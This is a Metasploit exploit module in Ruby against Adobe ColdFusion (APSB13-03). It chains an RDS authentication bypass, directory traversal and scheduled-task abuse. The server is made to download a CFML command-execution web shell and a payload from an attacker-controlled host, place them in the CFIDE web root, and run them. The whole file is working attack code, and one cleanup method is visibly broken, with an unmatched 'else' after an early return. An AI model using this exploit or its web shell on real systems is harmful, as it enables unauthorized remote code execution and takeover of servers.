require &#039;digest/sha1&#039;
require &#039;openssl&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Adobe ColdFusion APSB13-03&#039;,
      &#039;Description&#039; => %q{
        This module exploits a pile of vulnerabilities in Adobe ColdFusion APSB13-03:
          * CVE-2013-0625: arbitrary command execution in scheduleedit.cfm (9.x only)
          * CVE-2013-0629: directory traversal
          * CVE-2013-0632: authentication bypass
      },
      &#039;Author&#039;       =>
        [
          &#039;Jon Hart <jon_hart[at]rapid7.com&#039;, # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2013-0625&#039;],
          [ &#039;CVE&#039;, &#039;2013-0629&#039;],
          # we don&#039;t actually exploit this, as this is the backdoor
          # dropped by malware exploiting the other vulnerabilities
          [ &#039;CVE&#039;, &#039;2013-0631&#039;],
          [ &#039;CVE&#039;, &#039;2013-0632&#039;],
        ],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }],
          [
            &#039;Universal CMD&#039;,
            {
              &#039;Arch&#039;     => ARCH_CMD,
              &#039;Platform&#039; => [&#039;unix&#039;, &#039;win&#039;, &#039;linux&#039;]
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 1,
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => [ &#039;win&#039;, &#039;linux&#039; ],
      &#039;DisclosureDate&#039; => &#039;Jan 15 2013&#039;))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;The password for the specified username&#039; ]),
        OptBool.new(&#039;USERDS&#039;, [ true, &#039;Authenticate with RDS credentials&#039;, true ]),
        OptString.new(&#039;CMD&#039;, [ false, &#039;Command to run rather than dropping a payload&#039;, &#039;&#039; ]),
      ], self.class)
 
    register_advanced_options(
      [
        OptBool.new(&#039;DELETE_TASK&#039;, [ true, &#039;Delete scheduled task when done&#039;, true ]),
      ], self.class)
  end
 
  def check
    exploitable = 0
    exploitable += 1 if check_cve_2013_0629
    exploitable += 1 if check_cve_2013_0632
    exploitable > 0 ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end
 
  # Login any way possible, returning the cookies if successful, empty otherwise
  def login
    cf_cookies = {}
 
    ways = {
      &#039;RDS bypass&#039; => Proc.new { |foo| adminapi_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], true) },
      &#039;RDS login&#039; => Proc.new { |foo| adminapi_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], false) },
      &#039;Administrator login&#039; => Proc.new { |foo| administrator_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]) },
    }
    ways.each do |what, how|
      these_cookies = how.call
      if got_auth? these_cookies
        print_status "Authenticated using &#039;#{what}&#039; technique"
        cf_cookies = these_cookies
        break
      end
    end
 
    fail_with(Exploit::Failure::NoAccess, "Unable to authenticate") if cf_cookies.empty?
    cf_cookies
  end
 
  def exploit
    # login
    cf_cookies = login
 
    # if we managed to login, get the listener ready
    datastore[&#039;URIPATH&#039;] = rand_text_alphanumeric(6)
    srv_uri = "http://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}"
    start_service
 
    # drop a payload on disk which we can used to execute
    # arbitrary commands, which will be needed regardless of
    # which technique (cmd, payload) the user wants
    input_exec = srv_uri + "/#{datastore[&#039;URIPATH&#039;]}-e"
    output_exec = "#{datastore[&#039;URIPATH&#039;]}-e.cfm"
    schedule_drop cf_cookies, input_exec, output_exec
 
    if datastore[&#039;CMD&#039;] and not datastore[&#039;CMD&#039;].empty?
      # now that the coldfusion exec is on disk, execute it,
      # passing in the command and arguments
      parts = datastore[&#039;CMD&#039;].split(/\s+/)
      res = execute output_exec, parts.shift, parts.join(&#039; &#039;)
      print_line res.body.strip
    else
      # drop the payload
      input_payload = srv_uri + "/#{datastore[&#039;URIPATH&#039;]}-p"
      output_payload = "#{datastore[&#039;URIPATH&#039;]}-p"
      schedule_drop cf_cookies, input_payload, output_payload
      # make the payload executable
      # XXX: windows?
      execute output_exec, &#039;chmod&#039;, "755 ../../wwwroot/CFIDE/#{output_payload}"
      # execute the payload
      execute output_exec, "../../wwwroot/CFIDE/#{output_payload}"
    end
    handler
  end
 
  def execute cfm, cmd, args=&#039;&#039;
    uri = "/CFIDE/" + cfm + "?cmd=#{cmd}&args=#{Rex::Text::uri_encode args}"
    send_request_raw( { &#039;uri&#039; => uri, &#039;method&#039; => &#039;GET&#039; }, 25 )
  end
 
  def on_new_session(client)
    return
    # TODO: cleanup
      client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
      @files.each do |file|
        client.fs.file.rm("#{file}")
      end
    else
      @files.each do |file|
        client.shell_command_token("rm #{file}")
      end
    end
  end
 
  def on_request_uri cli, request
    cf_payload = "test"
    case request.uri
    when "/#{datastore[&#039;URIPATH&#039;]}-e"
      cf_payload = <<-EOF
        <cfparam name="url.cmd" type="string" default="id"/>
        <cfparam name="url.args" type="string" default=""/>
        <cfexecute name=#url.cmd# arguments=#url.args# timeout="5" variable="output" />
        <cfoutput>#output#</cfoutput>
      EOF
    when "/#{datastore[&#039;URIPATH&#039;]}-p"
      cf_payload = payload.encoded
    end
    send_response(cli, cf_payload, { &#039;Content-Type&#039; => &#039;text/html&#039; })
  end
 
 
  # Given a hash of cookie key value pairs, return a string
  # suitable for use as an HTTP Cookie header
  def build_cookie_header cookies
    cookies.to_a.map { |a| a.join &#039;=&#039; }.join &#039;; &#039;
  end
 
  # this doesn&#039;t actually work
  def twiddle_csrf cookies, enable=false
    mode = (enable ? "Enabling" : "Disabling")
    print_status "#{mode} CSRF protection"
    params = {
      &#039;SessEnable&#039; => enable.to_s,
    }
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, "/CFIDE/administrator/settings/memoryvariables.cfm"),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;cookie&#039; => build_cookie_header(cookies),
        &#039;vars_post&#039; => params,
      })
    if res
      if res.body =~ /SessionManagement should/
        print_error "Error #{mode} CSRF"
      end
    else
      print_error "No response while #{mode} CSRF"
    end
  end
 
  # Using the provided +cookies+, schedule a ColdFusion task
  #  to request content from +input_uri+ and drop it in +output_path+
  def schedule_drop cookies, input_uri, output_path
    vprint_status "Attempting to schedule ColdFusion task"
    cookie_hash = cookies
 
    scheduletasks_path = "/CFIDE/administrator/scheduler/scheduletasks.cfm"
    scheduleedit_path = "/CFIDE/administrator/scheduler/scheduleedit.cfm"
    # make a request to the scheduletasks page to pick up the CSRF token
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, scheduletasks_path),
        &#039;method&#039; => &#039;GET&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;cookie&#039; => build_cookie_header(cookie_hash),
      })
    cookie_hash.merge! get_useful_cookies res
 
    if res
      # XXX: I can only seem to get this to work if &#039;Enable Session Variables&#039;
      # is disabled (Server Settings -> Memory Variables)
      token = res.body.scan(/<input type="hidden" name="csrftoken" value="([^\"]+)"/).flatten.first
      unless token
        print_warning "Empty CSRF token found -- either CSRF is disabled (good) or we couldn&#039;t get one (bad)"
        #twiddle_csrf cookies, false
        token = &#039;&#039;
      end
    else
      fail_with(Exploit::Failure::Unknown, "No response when trying to GET scheduletasks.cfm for task listing")
    end
 
    # make a request to the scheduletasks page again, this time passing in our CSRF token
    # in an attempt to get all of the other cookies used in a request
    cookie_hash.merge! get_useful_cookies res
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, scheduletasks_path) + "?csrftoken=#{token}&submit=Schedule+New+Task",
        &#039;method&#039; => &#039;GET&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;cookie&#039; => build_cookie_header(cookie_hash),
      })
 
    fail_with(Exploit::Failure::Unknown, "No response when trying to GET scheduletasks.cfm for new task") unless res
 
    # pick a unique task ID
    task_id = SecureRandom.uuid
    # drop the backdoor in the CFIDE directory so it can be executed
    publish_file = &#039;../../wwwroot/CFIDE/&#039; + output_path
    # pick a start date.  This must be in the future, so pick
    # one sufficiently far ahead to account for time zones,
    # improper time keeping, solar flares, drift, etc.
    start_date = "03/15/#{Time.now.strftime(&#039;%Y&#039;).to_i + 1}"
    params = {
      &#039;csrftoken&#039; => token,
      &#039;TaskName&#039; => task_id,
      &#039;Group&#039; => &#039;default&#039;,
      &#039;Start_Date&#039; => start_date,
      &#039;End_Date&#039; => &#039;&#039;,
      &#039;ScheduleType&#039; => &#039;Once&#039;,
      &#039;StartTimeOnce&#039; => &#039;1:37 PM&#039;,
      &#039;Interval&#039; => &#039;Daily&#039;,
      &#039;StartTimeDWM&#039; => &#039;&#039;,
      &#039;customInterval_hour&#039; => &#039;0&#039;,
      &#039;customInterval_min&#039; => &#039;0&#039;,
      &#039;customInterval_sec&#039; => &#039;0&#039;,
      &#039;CustomStartTime&#039; => &#039;&#039;,
      &#039;CustomEndTime&#039; => &#039;&#039;,
      &#039;repeatradio&#039; => &#039;norepeatforeverradio&#039;,
      &#039;Repeat&#039; => &#039;&#039;,
      &#039;crontime&#039; => &#039;&#039;,
      &#039;Operation&#039; => &#039;HTTPRequest&#039;,
      &#039;ScheduledURL&#039; => input_uri,
      &#039;Username&#039; => &#039;&#039;,
      &#039;Password&#039; => &#039;&#039;,
      &#039;Request_Time_out&#039; => &#039;&#039;,
      &#039;proxy_server&#039; => &#039;&#039;,
      &#039;http_proxy_port&#039; => &#039;&#039;,
      &#039;publish&#039; => &#039;1&#039;,
      &#039;publish_file&#039; => publish_file,
      &#039;publish_overwrite&#039; => &#039;on&#039;,
      &#039;eventhandler&#039; => &#039;&#039;,
      &#039;exclude&#039; => &#039;&#039;,
      &#039;onmisfire&#039; => &#039;&#039;,
      &#039;onexception&#039; => &#039;&#039;,
      &#039;oncomplete&#039; => &#039;&#039;,
      &#039;priority&#039; => &#039;5&#039;,
      &#039;retrycount&#039; => &#039;3&#039;,
      &#039;advancedmode&#039; => &#039;true&#039;,
      &#039;adminsubmit&#039; => &#039;Submit&#039;,
      &#039;taskNameOriginal&#039; => task_id,
      &#039;groupOriginal&#039; => &#039;default&#039;,
      &#039;modeOriginal&#039; => &#039;server&#039;,
    }
 
    cookie_hash.merge! (get_useful_cookies res)
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, scheduleedit_path),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;cookie&#039; => build_cookie_header(cookie_hash),
        &#039;vars_post&#039; => params,
      })
 
    if res
      # if there was something wrong with the task, capture those errors
      # print them and abort
      errors = res.body.scan(/<li class="errorText">(.*)<\/li>/i).flatten
      if errors.empty?
        if res.body =~ /SessionManagement should/
          fail_with(Exploit::Failure::NoAccess, "Unable to bypass CSRF")
        end
        print_status "Created task #{task_id}"
      else
        fail_with(Exploit::Failure::NoAccess, "Unable to create task #{task_id}: #{errors.join(&#039;,&#039;)}")
      end
    else
      fail_with(Exploit::Failure::Unknown, "No response when creating task #{task_id}")
    end
 
    print_status "Executing task #{task_id}"
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, scheduletasks_path) + "?runtask=#{task_id}&csrftoken=#{token}&group=default&mode=server",
        &#039;method&#039; => &#039;GET&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;cookie&#039; => build_cookie_header(cookie_hash),
      })
 
    #twiddle_csrf cookies, true
    if datastore[&#039;DELETE_TASK&#039;]
      print_status "Removing task #{task_id}"
      res = send_request_cgi(
        {
          &#039;uri&#039;    => normalize_uri(target_uri.path, scheduletasks_path) + "?action=delete&task=#{task_id}&csrftoken=#{token}",
          &#039;method&#039; => &#039;GET&#039;,
          &#039;connection&#039; => &#039;TE, close&#039;,
          &#039;cookie&#039; => build_cookie_header(cookie_hash),
        })
    end
 
    vprint_status normalize_uri(target_uri, publish_file)
    publish_file
  end
 
  # Given the HTTP response +res+, extract any interesting, non-empty
  # cookies, returning them as a hash
  def get_useful_cookies res
    set_cookie = res.headers[&#039;Set-Cookie&#039;]
    # Parse the Set-Cookie header
    parsed_cookies = CGI::Cookie.parse(set_cookie)
 
    # Clean up the cookies we got by:
    #   * Dropping Path and Expires from the parsed cookies -- we don&#039;t care
    #   * Dropping empty (reset) cookies
    %w(Path Expires).each do |ignore|
      parsed_cookies.delete ignore
      parsed_cookies.delete ignore.downcase
    end
    parsed_cookies.keys.each do |name|
      parsed_cookies[name].reject! { |value| value == &#039;""&#039; }
    end
    parsed_cookies.reject! { |name,values| values.empty? }
 
    # the cookies always seem to start with CFAUTHORIZATION_, but
    # give the module the ability to log what it got in the event
    # that this stops becoming an OK assumption
    unless parsed_cookies.empty?
      vprint_status "Got the following cookies after authenticating: #{parsed_cookies}"
    end
    cookie_pattern = /^CF/
    useful_cookies = parsed_cookies.select { |name,value| name =~ cookie_pattern }
    if useful_cookies.empty?
      vprint_status "No #{cookie_pattern} cookies found"
    else
      vprint_status "The following cookies could be used for future authentication: #{useful_cookies}"
    end
    useful_cookies
  end
 
  # Authenticates to ColdFusion Administrator via the adminapi using the
  # specified +user+ and +password+.  If +use_rds+ is true, it is assumed that
  # the provided credentials are for RDS, otherwise they are assumed to be
  # credentials for ColdFusion Administrator.
  #
  # Returns a hash (cookie name => value) of the cookies obtained
  def adminapi_login user, password, use_rds
    vprint_status "Attempting ColdFusion Administrator adminapi login"
    user ||= &#039;&#039;
    password ||= &#039;&#039;
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, %w(CFIDE adminapi administrator.cfc)),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;vars_post&#039; => {
          &#039;method&#039; => &#039;login&#039;,
          &#039;adminUserId&#039; => user,
          &#039;adminPassword&#039; => password,
          &#039;rdsPasswordAllowed&#039; => (use_rds ? &#039;1&#039; : &#039;0&#039;)
        }
      })
 
    if res
      if res.code == 200
        vprint_status "HTTP #{res.code} when authenticating"
        return get_useful_cookies(res)
      else
        print_error "HTTP #{res.code} when authenticating"
      end
    else
      print_error "No response when authenticating"
    end
 
    {}
  end
 
  # Authenticates to ColdFusion Administrator using the specified +user+ and
  # +password+
  #
  # Returns a hash (cookie name => value) of the cookies obtained
  def administrator_login user, password
    cf_cookies = administrator_9x_login user, password
    unless got_auth? cf_cookies
      cf_cookies = administrator_10x_login user, password
    end
    cf_cookies
  end
 
  def administrator_10x_login user, password
    # coldfusion 10 appears to do:
    #   cfadminPassword.value = hex_sha1(cfadminPassword.value)
    vprint_status "Trying ColdFusion 10.x Administrator login"
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, %w(CFIDE administrator enter.cfm)),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;cfadminUserId&#039; => user,
          &#039;cfadminPassword&#039; => Digest::SHA1.hexdigest(password).upcase,
          &#039;requestedURL&#039; => &#039;/CFIDE/administrator/index.cfm&#039;,
        &#039;submit&#039; => &#039;Login&#039;,
        }
      })
 
    if res
      if res.code.to_s =~ /^30[12]/
        useful_cookies = get_useful_cookies res
        if got_auth? useful_cookies
          return useful_cookies
        end
      else
        if res.body =~ /<title>Error/i
          print_status "Appears to be restricted and/or not ColdFusion 10.x"
        elsif res.body =~ /A License exception has occurred/i
          print_status "Is license restricted"
        else
          vprint_status "Got unexpected HTTP #{res.code} response when sending a ColdFusion 10.x request.  Not 10.x?"
          vprint_status res.body
        end
      end
    end
 
    return {}
  end
 
  def got_auth? cookies
    not cookies.select { |name,values| name =~ /^CFAUTHORIZATION_/ }.empty?
  end
 
  def administrator_9x_login user, password
    vprint_status "Trying ColdFusion 9.x Administrator login"
    # coldfusion 9 appears to do:
    #   cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));
    #
    # You can get a current salt from
    #   http://<host>:8500/CFIDE/adminapi/administrator.cfc?method=getSalt&name=CFIDE.adminapi.administrator&path=/CFIDE/adminapi/administrator.cfc#method_getSalt
    #
    # Unfortunately that URL might be restricted and the salt really just looks
    # the epoch, so just use that
    salt = (Time.now.to_i * 1000).to_s
    pass = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(&#039;sha1&#039;), salt, Digest::SHA1.hexdigest(password).upcase).upcase
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, %w(CFIDE administrator enter.cfm)),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;submit&#039; => &#039;Login&#039;,
          &#039;salt&#039; => salt,
          &#039;cfadminUserId&#039; => user,
          &#039;requestedURL&#039; => &#039;/CFIDE/administrator/index.cfm&#039;,
          &#039;cfadminPassword&#039; => pass,
        }
      })
    if res
      return get_useful_cookies res
    else
      print_error "No response while trying ColdFusion 9.x authentication"
    end
 
    {}
  end
 
  # Authenticates to ColdFusion ComponentUtils using the specified +user+ and +password+
  #
  # Returns a hash (cookie name => value) of the cookies obtained
  def componentutils_login user, password
    vprint_status "Attempting ColdFusion ComponentUtils login"
    vars = {
          &#039;j_password_required&#039; => "Password+Required",
          &#039;submit&#039; => &#039;Login&#039;,
    }
    vars[&#039;rdsUserId&#039;] = user if user
    vars[&#039;j_password&#039;] = password if password
    res = send_request_cgi(
      {
        &#039;uri&#039;    => normalize_uri(target_uri.path, %w(CFIDE componentutils cfcexplorer.cfc)),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;vars_post&#039; => vars
      })
 
    cf_cookies = {}
    if res.code.to_s =~ /^(?:200|30[12])$/
      cf_cookies = get_useful_cookies res
    else
      print_error "HTTP #{res.code} while attempting ColdFusion ComponentUtils login"
    end
 
    cf_cookies
  end
 
  def check_cve_2013_0629
    vulns = 0
    paths = %w(../../../license.txt ../../../../license.html)
 
    # first try password-less bypass in the event that this thing
    # was just wide open
    vuln_without_creds = false
    paths.each do |path|
      if (traverse_read path, nil) =~ /ADOBE SYSTEMS INCORPORATED/
        vulns += 1
        vuln_without_creds = true
        break
      end
    end
 
    if vuln_without_creds
      print_status "#{datastore[&#039;RHOST&#039;]} is vulnerable to CVE-2013-0629 without credentials"
    else
      print_status "#{datastore[&#039;RHOST&#039;]} is not vulnerable to CVE-2013-0629 without credentials"
    end
 
    # if credentials are provided, try those too
    if datastore[&#039;USERNAME&#039;] and datastore[&#039;PASSWORD&#039;]
      vuln_without_bypass = false
      paths.each do |path|
        cf_cookies = componentutils_login datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]
        if (traverse_read path, cf_cookies) =~ /ADOBE SYSTEMS INCORPORATED/
          vulns += 1
          vuln_without_bypass = true
          break
        end
      end
 
      if vuln_without_bypass
        print_status "#{datastore[&#039;RHOST&#039;]} is vulnerable to CVE-2013-0629 with credentials"
      else
        print_status "#{datastore[&#039;RHOST&#039;]} is not vulnerable to CVE-2013-0629 with credentials"
      end
    end
 
    # now try with the CVE-2013-0632 bypass, in the event that this wasn&#039;t *totally* wide open
    vuln_with_bypass = false
    paths.each do |path|
      cf_cookies = adminapi_login datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], true
      # we need to take the cookie value from CFAUTHORIZATION_cfadmin
      # and use it for CFAUTHORIZATION_componentutils
      cf_cookies[&#039;CFAUTHORIZATION_componentutils&#039;] = cf_cookies[&#039;CFAUTHORIZATION_cfadmin&#039;]
      cf_cookies.delete &#039;CFAUTHORIZATION_cfadmin&#039;
      if (traverse_read path, cf_cookies) =~ /ADOBE SYSTEMS INCORPORATED/
        vulns += 1
        vuln_with_bypass = true
        break
      end
    end
 
    if vuln_with_bypass
      print_status "#{datastore[&#039;RHOST&#039;]} is vulnerable to CVE-2013-0629 in combination with CVE-2013-0632"
    else
      print_status "#{datastore[&#039;RHOST&#039;]} is not vulnerable to CVE-2013-0629 in combination with CVE-2013-0632"
    end
 
    vulns > 0
  end
 
  # Checks for CVE-2013-0632, returning true if the target is
  # vulnerable, false otherwise
  def check_cve_2013_0632
    if datastore[&#039;USERDS&#039;]
      # the vulnerability for CVE-2013-0632 is that if RDS is disabled during install but
      # subsequently *enabled* after install, the password is unset so we simply must
      # check that and only that.
      cf_cookies = adminapi_login &#039;foo&#039;, &#039;bar&#039;, true
      if cf_cookies.empty?
        print_status "#{datastore[&#039;RHOST&#039;]} is not vulnerable to CVE-2013-0632"
      else
        print_status "#{datastore[&#039;RHOST&#039;]} is vulnerable to CVE-2013-0632"
        return true
      end
    else
      print_error "Cannot test #{datastore[&#039;RHOST&#039;]} CVE-2013-0632 with USERDS off"
    end
    false
  end
 
  def traverse_read path, cookies
    uri = normalize_uri(target_uri.path)
    uri << "CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=CFIDE.adminapi.administrator&path="
    uri << path
    res = send_request_cgi(
      {
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;connection&#039; => &#039;TE, close&#039;,
        &#039;cookie&#039; => build_cookie_header(cookies)
      })
    res.body.gsub(/\r\n?/, "\n").gsub(/.<html>.<head>.<title>Component.*/m, &#039;&#039;)
  end
end

